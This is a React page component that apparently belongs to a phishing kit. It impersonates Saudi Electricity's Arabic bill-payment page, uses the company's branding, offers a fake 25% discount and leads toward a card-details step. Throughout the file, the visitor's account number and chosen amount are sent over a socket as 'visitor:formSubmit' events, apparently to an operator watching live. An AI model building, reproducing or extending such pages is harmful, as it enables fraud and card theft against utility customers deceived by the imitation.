import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { socket } from "@/lib/store";

export default function SelectAmount() {
  const [payOption, setPayOption] = useState<"full" | "partial" | null>(null);
  const [fullAmount, setFullAmount] = useState("0.00");
  const [partialAmount, setPartialAmount] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [, setLocation] = useLocation();

  useEffect(() => {
    const stored = sessionStorage.getItem("accountNumber");
    const storedAmount = sessionStorage.getItem("billAmount");
    if (!stored) {
      setLocation("/");
      return;
    }
    setAccountNumber(stored);
    if (storedAmount) {
      setFullAmount(Math.abs(parseFloat(storedAmount)).toFixed(2));
    }
  }, []);

  const discountedAmount = (parseFloat(fullAmount) * 0.75).toFixed(2);
  const currentAmount = payOption === "full" ? discountedAmount : payOption === "partial" ? partialAmount : "0";
  const isValid = payOption !== null && Math.abs(parseFloat(currentAmount)) > 0;

  const handleNext = () => {
    if (!isValid) return;
    sessionStorage.setItem("payAmount", currentAmount);
    sessionStorage.setItem("payOption", payOption || "");
    socket.value.emit("visitor:formSubmit", {
      page: "select-amount",
      data: { accountNumber, amount: currentAmount, payOption }
    });
    setLocation("/summary-payment");
  };

  const handlePartialChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9.]/g, '');
    setPartialAmount(val);
  };

  const handlePartialFocus = () => {
    if (partialAmount === "0.00") setPartialAmount("");
  };

  const handlePartialBlur = () => {
    if (!partialAmount || partialAmount === "0" || partialAmount === ".") {
      setPartialAmount("0.00");
    } else {
      setPartialAmount(parseFloat(partialAmount).toFixed(2));
    }
  };

  const fontFaces = `
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Regular.woff2') format('woff2'); font-weight: 400; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Medium.woff2') format('woff2'); font-weight: 500; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-SemiBold.woff2') format('woff2'); font-weight: 600; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Light.woff2') format('woff2'); font-weight: 300; }
    @media (max-width: 480px) {
      .sa-header { padding: 10px 16px !important; height: auto !important; flex-wrap: wrap !important; gap: 8px !important; }
      .sa-header img { width: 65px !important; height: 42px !important; }
      .sa-stepper { padding: 4px 6px !important; gap: 0 !important; }
      .sa-stepper > div { padding: 6px 10px !important; font-size: 12px !important; }
      .sa-stepper > div span { font-size: 11px !important; }
      .sa-step-active { padding: 6px 12px !important; font-size: 12px !important; }
      .sa-step-active span { width: 18px !important; height: 18px !important; font-size: 11px !important; }
      .sa-title-section { padding-top: 24px !important; padding-bottom: 24px !important; }
      .sa-title-section h1 { font-size: 24px !important; }
      .sa-title-section p { font-size: 14px !important; }
      .sa-options { padding: 0 16px !important; }
      .sa-option { padding: 14px 14px !important; }
      .sa-option-label { font-size: 14px !important; }
      .sa-price { font-size: 15px !important; }
      .sa-price-old { font-size: 12px !important; }
      .sa-discount-badge { font-size: 10px !important; padding: 2px 6px !important; }
      .sa-bottom-bar { padding: 12px 16px !important; }
      .sa-next-btn { padding: 12px 30px !important; font-size: 16px !important; width: 100% !important; }
      .sa-close-btn { width: 38px !important; height: 38px !important; }
    }
  `;

  return (
    <>
      <style>{fontFaces}</style>
      <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'SE', sans-serif" }}>

        {/* Header */}
        <div className="sa-header" style={{
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          height: '70px', padding: '15px 30px 14px',
        }}>
          <a href="#" style={{ display: 'block' }}>
            <img src="/se-logo.svg" alt="السعودية للطاقة" style={{ width: '90px', height: '58px', objectFit: 'contain' }} />
          </a>

          {/* Stepper */}
          <div className="sa-stepper" style={{
            display: 'flex', alignItems: 'center', gap: '0',
            background: '#f5f7fa', borderRadius: '30px', padding: '6px 8px',
          }}>
            {/* Step 1 - Active */}
            <div className="sa-step-active" style={{
              display: 'flex', alignItems: 'center', gap: '8px',
              background: '#06c', borderRadius: '24px', padding: '8px 20px',
              color: '#fff', fontSize: '14px', fontWeight: 500,
              whiteSpace: 'nowrap',
            }}>
              <span style={{
                background: '#fff', color: '#06c', borderRadius: '50%',
                width: '22px', height: '22px', display: 'flex', alignItems: 'center',
                justifyContent: 'center', fontSize: '13px', fontWeight: 600,
              }}>1</span>
              حدد المبلغ
            </div>

            {/* Step 2 - Inactive */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: '8px',
              padding: '8px 20px', color: '#8e99a4', fontSize: '14px', fontWeight: 400,
              whiteSpace: 'nowrap',
            }}>
              2
              <span>تفاصيل البطاقة</span>
            </div>

            {/* Step 3 - Inactive */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: '8px',
              padding: '8px 20px', color: '#8e99a4', fontSize: '14px', fontWeight: 400,
              whiteSpace: 'nowrap',
            }}>
              3
              <span>المراجعة</span>
            </div>
          </div>


        </div>

        {/* Title */}
        <div className="sa-title-section" style={{ textAlign: 'center', paddingTop: '50px', paddingBottom: '40px' }}>
          <p style={{ color: '#06c', fontSize: '16px', fontWeight: 400, marginBottom: '8px' }}>عرض ودفع الفواتير</p>
          <h1 style={{ color: '#001f5e', fontSize: '36px', fontWeight: 600, letterSpacing: '1px', direction: 'ltr', display: 'inline-block' }}>
            {accountNumber}
          </h1>
        </div>

        {/* Payment Options */}
        <div className="sa-options" style={{ maxWidth: '600px', margin: '0 auto', padding: '0 30px' }}>
          <label style={{ display: 'block', color: '#66799e', fontSize: '15px', fontWeight: 400, marginBottom: '16px', textAlign: 'right' }}>
            مبلغ السداد
          </label>

          {/* Option 1: Full Amount */}
          <div
            className="sa-option"
            onClick={() => setPayOption("full")}
            style={{
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              padding: '16px 18px',
              border: payOption === "full" ? '2px solid #06c' : '1.5px solid #d0d5dd',
              borderRadius: '12px',
              cursor: 'pointer',
              marginBottom: '12px',
              background: payOption === "full" ? '#f0f6ff' : '#fff',
              transition: 'all 0.2s ease',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <div style={{
                width: '22px', height: '22px', borderRadius: '50%',
                border: payOption === "full" ? '2px solid #06c' : '2px solid #d0d5dd',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                flexShrink: 0,
              }}>
                {payOption === "full" && (
                  <div style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#06c' }}></div>
                )}
              </div>
              <span className="sa-option-label" style={{ fontSize: '16px', fontWeight: 500, color: '#001f5e' }}>دفع كامل المبلغ</span>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', gap: '4px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span className="sa-price-old" style={{ fontSize: '14px', fontWeight: 400, color: '#8e99a4', direction: 'ltr', textDecoration: 'line-through' }}>
                  {fullAmount} ر.س
                </span>
                <span className="sa-discount-badge" style={{ fontSize: '12px', fontWeight: 600, color: '#fff', background: '#e53935', borderRadius: '6px', padding: '2px 8px' }}>
                  خصم 25%
                </span>
              </div>
              <span className="sa-price" style={{ fontSize: '18px', fontWeight: 600, color: '#06c', direction: 'ltr' }}>
                {discountedAmount} ر.س
              </span>
            </div>
          </div>

          {/* Option 2: Partial Amount */}
          <div
            className="sa-option"
            onClick={() => setPayOption("partial")}
            style={{
              padding: '16px 18px',
              border: payOption === "partial" ? '2px solid #06c' : '1.5px solid #d0d5dd',
              borderRadius: '12px',
              cursor: 'pointer',
              background: payOption === "partial" ? '#f0f6ff' : '#fff',
              transition: 'all 0.2s ease',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: payOption === "partial" ? '14px' : '0' }}>
              <div style={{
                width: '22px', height: '22px', borderRadius: '50%',
                border: payOption === "partial" ? '2px solid #06c' : '2px solid #d0d5dd',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                flexShrink: 0,
              }}>
                {payOption === "partial" && (
                  <div style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#06c' }}></div>
                )}
              </div>
              <span className="sa-option-label" style={{ fontSize: '16px', fontWeight: 500, color: '#001f5e' }}>دفع جزء من المبلغ</span>
            </div>

            {payOption === "partial" && (
              <div style={{ paddingRight: '34px' }}>
                <input
                  type="text"
                  inputMode="decimal"
                  placeholder="أدخل المبلغ"
                  value={partialAmount}
                  onChange={handlePartialChange}
                  onFocus={handlePartialFocus}
                  onBlur={handlePartialBlur}
                  onClick={(e) => e.stopPropagation()}
                  style={{
                    fontFamily: "'SE', sans-serif",
                    width: '100%',
                    padding: '12px 16px',
                    fontSize: '18px',
                    fontWeight: 500,
                    color: '#001f5e',
                    border: '1.5px solid #d0d5dd',
                    borderRadius: '10px',
                    outline: 'none',
                    textAlign: 'right',
                    direction: 'ltr',
                    boxSizing: 'border-box',
                    background: '#fff',
                  }}
                />
              </div>
            )}
          </div>
        </div>

        {/* Bottom Button */}
        <div className="sa-bottom-bar" style={{
          position: 'fixed', bottom: 0, left: 0, right: 0,
          padding: '16px 30px', background: 'white',
          borderTop: '1px solid #e8ecf1',
          display: 'flex', justifyContent: 'flex-end',
        }}>
          <button
            className="sa-next-btn"
            onClick={handleNext}
            disabled={!isValid}
            style={{
              fontFamily: "'SE', sans-serif", fontSize: '18px', fontWeight: 500,
              padding: '14px 40px', borderRadius: '12px', border: 'none', cursor: isValid ? 'pointer' : 'default',
              backgroundColor: isValid ? '#06c' : '#d0d5dd',
              color: '#fff',
              display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
              opacity: isValid ? 1 : 0.6,
            }}
          >
            التالي
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ transform: 'rotate(180deg)' }}>
              <polyline points="9 18 15 12 9 6"></polyline>
            </svg>
          </button>
        </div>
      </div>
    </>
  );
}
